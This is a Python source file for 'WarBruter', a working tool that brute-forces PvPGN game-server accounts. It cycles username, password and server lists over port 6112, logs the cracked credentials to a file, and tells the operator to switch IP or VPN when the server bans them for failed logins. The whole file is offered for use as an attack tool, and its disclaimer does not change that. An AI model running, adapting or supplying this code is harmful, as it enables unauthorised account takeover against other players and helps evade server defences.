###############################################
# __      __        ___          _     Ver1.4 #
# \ \    / /_ _ _ _| _ )_ _ _  _| |_ ___ _ _  #
#  \ \/\/ / _` | '_| _ \ '_| || |  _/ -_) '_| #
#   \_/\_/\__,_|_| |___/_|  \_,_|\__\___|_|   #
#                               by USA-Archer #
###############################################

# WarBruter Ver1.4 by USA-Archer
# 
# This program bruteforces PvPGN accounts using a password list
#
#    Copyright (C) 2015 USA-Archer
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see http://www.gnu.org/licenses/.
#
# DISCLAIMER: Please do not use in military or secret service organizations or
# for illegal purposes.
#
# DESCRIPTION:
# - WarBruter bruteforces PvPGN accounts using a password list
# - Support for username, and server lists allow for unattended
# - bruteforcing of multiple accounts on multiple servers consecutively

# USED FOR TCP IP COMMUNICATION
import socket

# USED FOR SLEEP DELAY
import time

# USED FOR CALULATING ATTEMPTS PER MINUTE, SECOND
from datetime import datetime, timedelta

# USED FOR EXTERNAL IP CHECK
import urllib, json

# PRINT 'LOADING' BECAUSE EXT_IP CHECK TAKES A COUPLE SECONDS
print "Loading WarBruter... Please wait\n"

# USED TO FETCH EXTERNAL IP ADDRESS
try:
    EXT_IP = json.loads(urllib.urlopen("http://api.ipify.org?format=json").read())
except Exception as e:
    pass

# BANNER
print ("###############################################")
print ("# __      __        ___          _     Ver1.4 #")
print ("# \ \    / /_ _ _ _| _ )_ _ _  _| |_ ___ _ _  #")
print ("#  \ \/\/ / _` | '_| _ \ '_| || |  _/ -_) '_| #")
print ("#   \_/\_/\__,_|_| |___/_|  \_,_|\__\___|_|   #")
print ("#                               by USA-Archer #")  
print ("###############################################\n") 
print "# WarBruter Ver1.4 by USA~Archer"
print "# This program bruteforces PvPGN accounts using a password list\n"
print "DISCLAIMER: Please do not use in military or secret service organizations or"
print "for illegal purposes.\n"

# TRY TO GET EXT_IP, IF FAIL PRINT AS UNKOWN
try:
    print "Current External IP Address: %s\n\n" % EXT_IP["ip"]
except:
    print "Current External IP Address: Unknown\n\n" 
    
# USER SUPPLIED VARIABLES
# GET USERNAME LIST OR PROVIDE username_list.txt, HANDLE ERROR IF NOT FOUND
while True:
    try:
        USERNAME_LIST = (raw_input("PvPGN Username list file [username_list.txt]: ") or "username_list.txt")
        # OPEN USERNAME_LIST, STRIP NEW LINES, SAVE AS VARIABLE USERS
        with open("configuration_files/" + USERNAME_LIST, 'r') as USERNAME_LIST:
            USERS = [line.strip() for line in USERNAME_LIST]
    except IOError:
        print "\n[!] ERROR: Could not find '%s'\n" % USERNAME_LIST
        continue
    break

# GET PASSWORD LIST OR PROVIDE password_list.TXT, HANDLE ERROR IF NOT FOUND
while True:
    try:
        PASSWORD_LIST = (raw_input("Name of your dictionary file [password_list.txt]: ") or "password_list.txt")
        # OPEN PASSWORD_LIST, STRIP NEW LINES, SAVE AS VARIABLE PASSWORDS
        with open("configuration_files/" + PASSWORD_LIST, 'r') as PASSWORD_LIST:
            PASSWORDS = [line.strip() for line in PASSWORD_LIST]
            
    except IOError:
        print "\n[!] ERROR: Could not find '%s'\n" % PASSWORD_LIST
        continue
    break

# GET SERVER NAME OR PROVIDE server_list.txt, HANDLE ERROR IF NOT FOUND
while True:
    try:
        SERVER_LIST = (raw_input("PvPGN Server List [server_list.txt]: ") or "server_list.txt")
        # OPEN SERVER_LIST STRIP NEW LINES, SAVE AS VARIABLE SERVERS
        with open("configuration_files/" + SERVER_LIST, 'r') as SERVER_LIST:
            SERVERS = [line.strip() for line in SERVER_LIST]
            
    except IOError:
        print "\n[!] ERROR: Could not find '%s'\n" % SERVER_LIST
        continue
    break

# HARD CODED VARIABLES
BUFFER_SIZE =  1024
PORT = 6112

# CREATE VARIABLES TO BE USED FOR MATH LATER ON
NUM_OF_USERS = sum(1 for _ in USERS)
NUM_OF_PASSWORDS = sum(1 for _ in PASSWORDS)
NUM_OF_SERVERS = sum(1 for _ in SERVERS)
NUM_OF_TOTAL_ATTEMPTS = NUM_OF_SERVERS * NUM_OF_USERS * NUM_OF_PASSWORDS

# ALIASES FOR VARIABLES AND OTHER DEFAULT SETTINGS
ORIGINAL_NUM_OF_PASSWORDS = NUM_OF_PASSWORDS
ORIGINAL_NUM_OF_TOTAL_ATTEMPTS = NUM_OF_TOTAL_ATTEMPTS
NUM_OF_PASSWORDS_REMAINING = NUM_OF_PASSWORDS
NUM_OF_TOTAL_ATTEMPTS_REMAINING = NUM_OF_TOTAL_ATTEMPTS

# THIS VARIABLE HOLDS THE AMOUNT OF TIME THAT WAS SPENT SLEEPING. FOR EXAMPLE,
# AFTER A PASSWORD IS FOUND, IT IS DISPLAYED FOR 10 SECONDS BEFORE CONTINUING
# THIS VARIABLE IS THEN SUBTRACTED FROM TIME_ELAPSED TO GIVE ACCURATE TIMES
# FOR BRUTEFORCE SPEED TRACKING. IT IS SET TO 0 BY DEFAULT BUT IS ADDED TO
# BY EACH SLEEP THAT OCCURS
SLEEP_OFFSET = timedelta(seconds=0)

# THIS VARIABLE HOLDS THE AMOUNT OF TIME THAT WAS SPENT WAITING FOR USER INPUT,
# AFTER AN ERROR OCCURRED. IT IS LATER SUBTRACTED FROM TIME_ELAPSED TO GIVE
# ACCURATE TIMES FOR BRUTEFORCE SPEED TRACKING. IT IS SET TO 0 BY DEFAULT BUT 
# IS ADDED TO BY EACH ERROR OFFSET THAT OCCURS
ERROR_OFFSET_TOTAL = timedelta(seconds=0)

# PLACEHOLDER TO BE ADDED TO LATER
ACCOUNTS_CRACKED = 0

# START RECORDING TIME NOW
START_TIME = datetime.now()

# FOR EACH SERVER DO THIS
for SERVER in SERVERS:

    # FOR EACH USER DO THIS
    for USER in USERS:

        # SET NUM_OF_PASSWORDS TO DEFAULT AT START OF EACH USER ITERATION
        NUM_OF_PASSWORDS_REMAINING = ORIGINAL_NUM_OF_PASSWORDS

        # FOR EACH PASSWORD DO THIS
        for PASSWORD in PASSWORDS:
            # START A LOOP, TRY TO LOG IN
            while True:
                try:
                    # DEFINE SOCKET AS TCP IP
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # CONNECT TO SERVER
                    s.connect((SERVER, PORT))
                    # LOG IN: HIT ENTER TO INTERACT WITH THE TERMINAL
                    s.send("\r\n")
                    # TYPE USERNAME
                    s.send(USER)
                    # HIT ENTER TO SEND USERNAME
                    s.send("\r\n")
                    # TYPE PASSWORD
                    s.send(PASSWORD)
                    # HIT ENTER TO SEND PASSWORD
                    s.send("\r\n")
                    # RECIEVE DATA BACK
                    data = s.recv(BUFFER_SIZE)
                    data = s.recv(BUFFER_SIZE)
                    # IF NO ERROR OCCURRED, EXIT THE 'while True' LOOP
                    break
                # IF ERROR OCCURED EITHER WHILE CONNECTING OR RECEVING DATA BACK, DO THIS
                except socket.error:
                    # START THE TIMER FOR THIS ERROR SESSION, THIS WILL LATER BE SUBTRACTED FROM TIME_ELAPSED FOR SPEED CALCS
                    ERROR_START_TIME = datetime.now()
                    # START A LOOP, GIVE ERROR MESSAGE, WAIT FOR USER INPUT
                    while True:
                        # PRINT ERROR MESSAGE
                        print "\n\n[!] ERROR: Could not connect to server: %s \n\nCheck if the server name above is correct and online ... \nYou've probably been IP banned for too many failed login attempts." % SERVER
                        print "Change your External IP Address/VPN before continuing."
                        # TRY TO GET EXT_IP, IF FAIL PRINT AS UNKOWN
                        try:
                            print "Current External IP Address: %s\n" % EXT_IP["ip"]
                        except: 
                            print "Current External IP Address: Unknown\n"
                        # GET USER INPUT - CHECK IP OR CONTINUE ATTACK?
                        choice = raw_input("Enter [ip] to check your External IP again or [c] to continue attack: ")
                        # IF USER CHOOSES TO CONTINUE ATTACK, DO THIS
                        if choice == "c":
                            # STOP ERROR TIME CLOCK
                            ERROR_STOP_TIME = datetime.now()
                            # FIND TIME ELAPSED WHILE WAITING ON ERROR LOOP
                            ERROR_OFFSET = ERROR_STOP_TIME - ERROR_START_TIME
                            # ADD THIS ERROR TIME TO TOTAL ERROR OFFSET TIME WHICH WILL LATER BE SUBTRACTED FROM TIME_ELAPSED
                            ERROR_OFFSET_TOTAL = ERROR_OFFSET_TOTAL + ERROR_OFFSET
                            break
                        # ELSE IF CHECK IP IS CHOSEN
                        elif choice == "ip":
                            print "\n\nRechecking Current External IP Address..."
                            # TRY TO GET EXT_IP, IF FAIL THEN CONTINUE WITHOUT
                            try:
                                EXT_IP = json.loads(urllib.urlopen("https://api.ipify.org?format=json").read())
                            except:
                                pass
                            # REPEAT THE 'while True' LOOP
                            continue
                        # IF NOT 'c' OR 'ip', THEN THE INPUT IS INVALID, REPEAT THE 'while True' LOOP
                        else:
                            print "\n\n[!] ERROR: Invalid Selection. Try again ..."
                            continue
                # GO BACK TO THE PREVIOUS 'while True' AND TRY THE SAME PASSWORD AGAIN
                continue

            # IF THE DATA RECIEVED AFTER LOGGING IN CONTAINS "FAILED" DO THIS
            if "failed" in data:
                # RECALCULATE VARIABLES TO GET UPDATE FOR STATUS
                TIME_ELAPSED = datetime.now() - START_TIME
                TIME_ELAPSED = TIME_ELAPSED - SLEEP_OFFSET
                TIME_ELAPSED = TIME_ELAPSED - ERROR_OFFSET_TOTAL
                MINUTES = TIME_ELAPSED.total_seconds() / 60.0
                SECONDS = TIME_ELAPSED.total_seconds()
                # DIVMOD PERFORMS DIVISION TO CALCULATE THE h:mm:ss DISPLAY
                M, S = divmod(SECONDS, 60)
                H, M = divmod(M, 60)
                # DECREMENT TOTAL ATTEMPTS REMAINING BY 1
                NUM_OF_TOTAL_ATTEMPTS_REMAINING = NUM_OF_TOTAL_ATTEMPTS_REMAINING - 1
                # DECREMENT REMAINING PASSWORDS FOR THIS USER BY 1
                NUM_OF_PASSWORDS_REMAINING = NUM_OF_PASSWORDS_REMAINING - 1
                # CALCULATE ATTEMPTS PER MINUTE AND ATTEMPS PER SECOND
                ATTEMPTS_PER_MINUTE = (ORIGINAL_NUM_OF_TOTAL_ATTEMPTS - NUM_OF_TOTAL_ATTEMPTS_REMAINING) / MINUTES
                ATTEMPTS_PER_SECOND = (ORIGINAL_NUM_OF_TOTAL_ATTEMPTS - NUM_OF_TOTAL_ATTEMPTS_REMAINING) / SECONDS
                # ROUND ATTEMPTS_PER THEN CONVERT TO AN INTEGER, FOR EXAMPLE
                # 2.4563783459 -> 2.0 -> 2
                ATTEMPTS_PER_SECOND_INT = int(round(ATTEMPTS_PER_SECOND))
                ATTEMPTS_PER_MINUTE_INT = int(round(ATTEMPTS_PER_MINUTE))
                # USING DIVMOD AGAIN TO CALCULATE TIME REMAINING INTO h:mm:ss
                EST_SECONDS_TO_COMPLETE = NUM_OF_TOTAL_ATTEMPTS_REMAINING / ATTEMPTS_PER_SECOND
                EM, ES = divmod(EST_SECONDS_TO_COMPLETE, 60)
                EH, EM = divmod(EM, 60)
                # PRINT STATUS MESSAGE FOR THIS FAILED ATTEMPT
                print ("###############################################")
                print ("# __      __        ___          _     Ver1.4 #")
                print ("# \ \    / /_ _ _ _| _ )_ _ _  _| |_ ___ _ _  #")
                print ("#  \ \/\/ / _` | '_| _ \ '_| || |  _/ -_) '_| #")
                print ("#   \_/\_/\__,_|_| |___/_|  \_,_|\__\___|_|   #")
                print ("#                               by USA-Archer #")  
                print ("###############################################\n")   
                print "---------------------------------- STATUS --------------------------------------"
                try:
                    print "WarBruter using IP Address: %s" % EXT_IP["ip"]
                except:
                    pass
                print "\nTrying ..."
                print "Username: {USER}\nPassword: {PASSWORD}".format(USER=USER,PASSWORD=PASSWORD)
                print "Server: %s\n" % (SERVER)
                print "Passwords remaining for '%s': %s" % (USER, NUM_OF_PASSWORDS_REMAINING)
                print "Total tries remaining: %s" % NUM_OF_TOTAL_ATTEMPTS_REMAINING
                print "Average tries per minute: %s" % ATTEMPTS_PER_MINUTE_INT
                print "Average tries per second: %s" % ATTEMPTS_PER_SECOND_INT
                print "Time Elapsed [h:mm:ss]: %d:%02d:%02d" % (H, M, S)
                print "Estimate Time Remaining [h:mm:ss]: %d:%02d:%02d" % (EH, EM, ES)
                print ("Passwords found = %s" % ACCOUNTS_CRACKED)
                
                # CLOSE TCP IP SOCKET
                s.close()

                # CONTINUE PASSWORD LOOP
                continue

            # IF DATA CONTAINS "is here", PASSWORD = CRACKED, DO THIS
            elif "is here" in data:
                
                # IN THIS CASE, TOTAL ATTEMPTS REMAINING IS TOTAL ATTEMPTS MINUS THE LEFTOVER ATTEMPTS REMAINING FOR THIS USERNAME
                # WHICH WONT BE ATTEMPTED BECAUSE ATTEMPTS PER USERNAME WILL BE RESET AFTER THE LOOP BREAKS
                NUM_OF_TOTAL_ATTEMPTS_REMAINING = NUM_OF_TOTAL_ATTEMPTS_REMAINING - NUM_OF_PASSWORDS_REMAINING
                # THE LINE OF CODE BELOW IS A VER1.4 BUG FIX, THE ORIGINAL NUMBER OF TOTAL ATTEMPTS NEEDED TO SUBTRACT
                # THE PASSWORD CRACKED LEFTOVERS BECAUSE THEY ARE NO LONGER REAL ATTEMPTS - THEY WILL NEVER BE TRIED SO
                # THEY NEED TO BE REMOVED FROM THE CALCULATIONS OF PER MINUTE/PER SECOND. PREVIOUSLY PER MIN AND PER SEC
                # WERE BEING CALCULATED MUCH HIGHER THAN REALITY BECAUSE THE CALCULATIONS WERE ASSUMING THAT AFTER A
                # PASSWORD WAS CRACKED, THE REMAINING ATTEMPTS THAT ARE NEVER ATTEMPTED HAD ALREADY BEEN ATTEMPTED
                ORIGINAL_NUM_OF_TOTAL_ATTEMPTS = ORIGINAL_NUM_OF_TOTAL_ATTEMPTS - NUM_OF_PASSWORDS_REMAINING
                # UPDATE PASSWORDS FOUND + 1
                ACCOUNTS_CRACKED = ACCOUNTS_CRACKED + 1
                # PRINT SERVER, USERNAME, PASSWORD TO cracked_accounts/cracked_list.txt
                file = open("cracked_accounts/cracked_list.txt", "at")
                print >>file, SERVER + ", " + '{USER}'.format(USER=USER) + ", " + '{PASSWORD}'.format(PASSWORD=PASSWORD)
                file.close()
                # ADD 10 SECONDS TO SLEEP VAR TO BE SUBTRACTED BY OTHER TIME MATH
                SLEEP_OFFSET = SLEEP_OFFSET + timedelta(seconds=10)
                # CLOSE TCP IP SOCKET
                s.close()
                # PRINT STATUS MESSAGES FOR PASSWORD CRACKED
                print ("            xxxxxxx")                     
                print ("           xxx   xxx")                
                print ("      xxxxxxx     xxxxxxx")             
                print ("      xx   xxx   xxx   xx")            
                print ("     xx     xxxxxxx     xx")              
                print ("      xx   xxxxxxxxx   xx")         
                print ("       xxxxx xxxxx xxxxx")        
                print ("             xxxxx")         
                print ("             xxxxx")         
                print ("             xxxxx    PASSWORD FOUND!")
                print ("             xxxxx")          
                print ("             xxxxx")          
                print ("             xxxxx    Username = {USER}".format(USER=USER))          
                print ("             xxxxx    Password = {PASSWORD}".format(PASSWORD=PASSWORD)) 
                print ("             xxxxx    Server = %s" % SERVER)                     
                print ("          xxxxxxxx")                    
                print ("          xxxxxxxx")                        
                print ("             xxxxx")                                           
                print ("          xxxxxxxx")                 
                print ("          xxxxxxxx")                  
                print ("             xxxxx")          
                print ("\n\nSaved to 'cracked_accounts/cracked_list.txt'")
                print ("WarBruter will automatically resume in 10 seconds ...")
                time.sleep(5)
                print ("WarBruter will automatically resume in 5 seconds ...")
                time.sleep(5)
                # BREAK PASSWORD LOOP, GO TO NEXT USERNAME
                break
            else:
                print "\n\n\n\n[!] ERROR: WarBruter did not receive a valid response."
                print "\nUser: %s\nPassword: %s\nServer: %s\n\nCombination will need to be retried" % (USER, PASSWORD, SERVER)
                file = open("error_log/error_log.txt", "at")
                print >>file, SERVER + ", " + '{USER}'.format(USER=USER) + ", " + '{PASSWORD}'.format(PASSWORD=PASSWORD)
                print "cSaved to error_log/error_log.txt to be reviewed or tried again later.\n\n\n\n"

# WHEN ALL SERVER, USERNAME AND PASSWORD LOOPS HAVE COMPLETED, DO THIS
else:

    # IF 1 ACCOUNT WAS CRACKED, PRINT THIS SUMMARY
    if ACCOUNTS_CRACKED == 1:
        
            print ("            xxxxxxx")                     
            print ("           xxx   xxx")                
            print ("      xxxxxxx     xxxxxxx     Done.")             
            print ("      xx   xxx   xxx   xx")            
            print ("     xx     xxxxxxx     xx    WarBruter has tried all username and password")           
            print ("      xx   xxxxxxxxx   xx     combinations on all servers.")     
            print ("       xxxxx xxxxx xxxxx")        
            print ("             xxxxx")         
            print ("             xxxxx")         
            print ("             xxxxx    1  PASSWORD FOUND!")
            print ("             xxxxx")          
            print ("             xxxxx    Check 'cracked_accounts/cracked_list.txt' for details ")     
            print ("             xxxxx")          
            print ("             xxxxx")
            print ("             xxxxx    Average attempts per minute: %s" % ATTEMPTS_PER_MINUTE_INT)                    
            print ("          xxxxxxxx    Average attempts per second: %s" % ATTEMPTS_PER_SECOND_INT)                    
            print ("          xxxxxxxx    Number of total attempts: %s" % ORIGINAL_NUM_OF_TOTAL_ATTEMPTS)                        
            print ("             xxxxx")                                           
            print ("          xxxxxxxx    Time to complete [h:mm:ss]: %d:%02d:%02d" % (H, M, S))
            print ("          xxxxxxxx")                  
            print ("             xxxxx")  
            raw_input ("\n\n\nPress Enter to continue...")
    
    # IF MORE THAN 1 PASSWORD FOUND, PRINT THIS SUMMARY
    elif ACCOUNTS_CRACKED > 1:
            
            print ("            xxxxxxx")                     
            print ("           xxx   xxx")                
            print ("      xxxxxxx     xxxxxxx    Done.")             
            print ("      xx   xxx   xxx   xx")            
            print ("     xx     xxxxxxx     xx   WarBruter has tried all username and password")           
            print ("      xx   xxxxxxxxx   xx    combinations on all servers.")     
            print ("       xxxxx xxxxx xxxxx")        
            print ("             xxxxx")
            print ("             xxxxx")         
            print ("             xxxxx    %s  PASSWORDS FOUND!" % ACCOUNTS_CRACKED)
            print ("             xxxxx")          
            print ("             xxxxx    Check 'cracked_accounts/cracked_list.txt' for details ")     
            print ("             xxxxx")          
            print ("             xxxxx")
            print ("             xxxxx    Average attempts per minute: %s" % ATTEMPTS_PER_MINUTE_INT)                    
            print ("          xxxxxxxx    Average attempts per second: %s" % ATTEMPTS_PER_SECOND_INT)                    
            print ("          xxxxxxxx    Number of total attempts: %s" % ORIGINAL_NUM_OF_TOTAL_ATTEMPTS)    
            print ("             xxxxx")                                           
            print ("          xxxxxxxx    Time to complete [h:mm:ss]: %d:%02d:%02d" % (H, M, S))                 
            print ("          xxxxxxxx")                  
            print ("             xxxxx")  
            raw_input ("\n\n\nPress Enter to continue...")

    # ELSE IF 0 PASSWORDS FOUND, PRINT THIS SUMMARY
    else:
            print ("            xxxxxxx")                     
            print ("           xxx   xxx")                
            print ("      xxxxxxx     xxxxxxx      Done.")             
            print ("      xx   xxx   xxx   xx")            
            print ("     xx     xxxxxxx     xx     WarBruter has tried all username and password")           
            print ("      xx   xxxxxxxxx   xx      combinations on all servers.")     
            print ("       xxxxx xxxxx xxxxx")        
            print ("             xxxxx")
            print ("             xxxxx")         
            print ("             xxxxx    0  PASSWORDS FOUND!")
            print ("             xxxxx")          
            print ("             xxxxx    WarBruter was not able to crack any accounts. Note that")     
            print ("             xxxxx    if a user is logged in at the time of a correct password")          
            print ("             xxxxx    attempt, the WarBruter login will fail and password will")
            print ("             xxxxx    not be found. Make sure the target username is logged out")              
            print ("          xxxxxxxx    and try again with a better password list!")                   
            print ("          xxxxxxxx")
            print ("             xxxxx    Average attempts per minute: %s" % ATTEMPTS_PER_MINUTE_INT)
            print ("          xxxxxxxx    Average attempts per second: %s" % ATTEMPTS_PER_SECOND_INT)
            print ("          xxxxxxxx    Number of total attempts: %s" % ORIGINAL_NUM_OF_TOTAL_ATTEMPTS)
            print ("             xxxxx    Time to complete [h:mm:ss]: %d:%02d:%02d" % (H, M, S))
            raw_input ("\n\n\nPress Enter to continue...")
